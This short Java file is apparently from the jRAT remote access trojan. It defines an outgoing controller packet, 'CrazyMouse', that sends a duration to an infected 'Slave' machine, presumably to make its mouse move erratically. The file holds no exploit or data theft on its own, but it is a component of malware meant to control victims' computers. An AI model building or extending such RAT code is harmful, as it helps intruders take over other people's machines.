package se.jrat.controller.packets.outgoing;

import java.io.DataOutputStream;

import se.jrat.controller.Slave;


public class Packet46CrazyMouse extends AbstractOutgoingPacket {

	private int seconds;

	public Packet46CrazyMouse(int seconds) {
		this.seconds = seconds;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		dos.writeInt(seconds);
	}

	@Override
	public byte getPacketId() {
		return 46;
	}

}
